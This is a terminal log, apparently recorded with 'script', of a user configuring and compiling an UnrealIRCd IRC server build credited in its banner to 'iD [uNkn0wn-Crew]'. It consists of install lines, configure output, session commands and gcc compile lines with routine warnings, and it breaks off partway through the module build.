
 /usr/bin/install -c -m 644 './ares_strerror.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_strerror.3'

 /usr/bin/install -c -m 644 './ares_timeout.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_timeout.3'

 /usr/bin/install -c -m 644 './ares_version.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_version.3'

 /usr/bin/install -c -m 644 './ares_cancel.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_cancel.3'

 /usr/bin/install -c -m 644 './ares_parse_aaaa_reply.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_parse_aaaa_reply.3'

 /usr/bin/install -c -m 644 './ares_getnameinfo.3' '/home/jmap82/linux/extras/c-ares/man/man3/ares_getnameinfo.3'

make[1]: Leaving directory `/home/jmap82/linux/extras/c-ares-1.3.0'

configure: creating ./config.status

config.status: creating Makefile

config.status: creating src/modules/Makefile

config.status: creating unreal

config.status: creating ircdcron/ircdchk

config.status: creating include/setup.h



 _______________________________________________________________________

|                                                                       |

|                    UnrealIRCd Compile-Time Config                     |

|                     Modded by iD [uNkn0wn-Crew]                       |

|                    www.uNkn0wn.eu - iD@uNkn0wn.eu                     |

|_______________________________________________________________________|

|_______________________________________________________________________|

|                                                                       |

| Now all you have to do is type 'make' and let it compile. When that's |

| done, you will receive other instructions on what to do next.         |

|                                                                       |

|_______________________________________________________________________|

|_______________________________________________________________________|

|                        - The UnrealIRCd Team -                        |

|                                                                       |

| * Stskeeps  stskeeps@unrealircd.com                                   |

| * codemastr codemastr@unrealircd.com                                  |

| * Syzop     syzop@unrealircd.com                                      |

|_______________________________________________________________________|

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ 

]0;jmap82@JMAP2: ~/linuxjmap82@JMAP2:~/linux$ w

 23:44:10 up 2 days, 14:00,  4 users,  load average: 2.30, 1.01, 0.37

USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT

jmap82   tty7     :0               Thu09    2days  1:58   0.50s x-session-manag

jmap82   pts/0    :0.0             23:40    1:02m  0.04s  0.00s script -af /hom

jmap82   pts/2    :0.0             Thu23   45:40   0.72s  0.04s script -af /hom

jmap82   pts/4    :0.0             23:43    0.00s  0.00s  0.00s script -af /hom

]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ whi

wbash: whi: command not found

]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ who

jmap82   tty7         2009-03-19 09:44 (:0)

jmap82   pts/0        2009-03-21 23:40 (:0.0)

jmap82   pts/2        2009-03-19 23:17 (:0.0)

jmap82   pts/4        2009-03-21 23:43 (:0.0)

]0;jmap82@JMAP2: ~jmap82@JMAP2:~$ make

Building src

make[1]: Entering directory `/home/jmap82/linux/src'

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c timesynch.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c res.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_bsd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c auth.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c aln.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c channel.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c cloak.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c crule.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c dbuf.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c events.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c fdlist.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c hash.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c help.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c ircd.c

ircd.c: In function ‘check_pings’:

ircd.c:656: warning: format not a string literal and no format arguments

ircd.c:659: warning: format not a string literal and no format arguments

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c ircsprintf.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c list.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c lusers.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c match.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic     -c -o modules.o modules.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c packet.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c parse.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_auth.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_conf.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_debug.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_err.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_extra.c

s_extra.c: In function ‘ircd_log’:

s_extra.c:313: warning: ignoring return value of ‘write’, declared with attribute warn_unused_result

s_extra.c:324: warning: ignoring return value of ‘write’, declared with attribute warn_unused_result

s_extra.c:325: warning: ignoring return value of ‘write’, declared with attribute warn_unused_result

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_kline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_misc.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_numeric.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_serv.c

s_serv.c: In function ‘load_tunefile’:

s_serv.c:546: warning: ignoring return value of ‘fgets’, declared with attribute warn_unused_result

s_serv.c:548: warning: ignoring return value of ‘fgets’, declared with attribute warn_unused_result

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_svs.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c socket.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c ssl.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c s_user.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c charsys.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c scache.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c send.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c support.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c umodes.c

/bin/sh version.c.SH

Extracting src/version.c...

1.1.1.1.2.23 2006/06/16 18:29:12

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c version.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c whowas.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c zip.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c cidr.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c random.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c extcmodes.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c extbans.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c md5.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c api-isupport.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -c api-command.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic    -o ircd timesynch.o res.o s_bsd.o auth.o aln.o channel.o cloak.o crule.o dbuf.o events.o fdlist.o hash.o help.o ircd.o ircsprintf.o list.o lusers.o match.o modules.o packet.o parse.o s_auth.o s_conf.o s_debug.o s_err.o s_extra.o s_kline.o s_misc.o s_numeric.o s_serv.o s_svs.o  socket.o ssl.o s_user.o charsys.o scache.o send.o support.o umodes.o version.o whowas.o zip.o cidr.o random.o extcmodes.o extbans.o md5.o api-isupport.o api-command.o   -lcrypt -lnsl  -ldl -L/home/jmap82/linux/extras/regexp/lib -ltre   -lcares 

cd modules; make 'CFLAGS=-I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic  ' 'CC=gcc' 'IRCDLIBS=-lcrypt -lnsl  -ldl -L/home/jmap82/linux/extras/regexp/lib -ltre   -lcares' 'LDFLAGS=' 'IRCDMODE=711' 'BINDIR=/home/jmap82/linux/src/ircd' 'INSTALL=/usr/bin/install' 'INCLUDEDIR=../include' 'IRCDDIR=/home/jmap82/linux' 'MANDIR=' 'RM=/bin/rm' 'CP=/bin/cp' 'TOUCH=/usr/bin/touch' 'RES=' 'SHELL=/bin/sh' 'STRTOUL=' 'CRYPTOLIB=' 'CRYPTOINCLUDES=' 'URL='  all

make[2]: Entering directory `/home/jmap82/linux/src/modules'

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_sethost.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_chghost.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_chgident.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_setname.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_setident.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_sdesc.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svsmode.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_swhois.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svsmotd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svsnline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_who.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_mkpasswd.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_away.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svsnoop.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svso.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svsnick.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_adminchat.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_akill.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_chgname.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_guest.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_htm.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_kill.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_lag.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_message.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c webtv.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_nachat.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_oper.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_pingpong.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_quit.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_rakill.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_rping.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_sendumode.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_sqline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_tsctl.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_unkline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_unsqline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_unzline.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_whois.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_tkl.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_vhost.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_cycle.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svsjoin.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svspart.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svslusers.c

gcc -I../include -I/home/jmap82/linux/extras/regexp/include -I/home/jmap82/linux/extras/c-ares/include -L../extras/c-ares/lib -pipe -g -O2 -funsigned-char -fno-strict-aliasing -Wno-pointer-sign -export-dynamic   -fPIC -DPIC -shared  -c m_svswatch.c

